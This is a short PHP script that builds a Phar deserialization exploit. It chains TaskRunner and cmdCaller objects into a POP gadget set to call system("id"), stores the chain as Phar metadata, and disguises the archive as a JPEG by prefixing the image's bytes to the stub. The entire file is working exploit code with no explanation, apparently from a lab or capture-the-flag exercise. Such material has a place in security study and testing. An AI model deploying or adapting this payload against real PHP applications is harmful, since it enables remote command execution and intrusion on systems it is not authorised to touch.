<?php
include '../external_class/cmd_runner.php';

// Create the POP Chain
$runner = new TaskRunner();
$runner->task = new cmdCaller();

$runner->task->cmdName = "system";
$runner->task->cmdArgs = "id";

//Create the Phar Archice
$phar = new \Phar("test.phar");
$phar->startBuffering();
$phar->setStub(file_get_contents('image.jpg') . "<?php __HALT_COMPILER(); ?>");

//Begin of serialization
$phar->setMetadata($runner);

//Zip file within the Phar Archive
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();

?>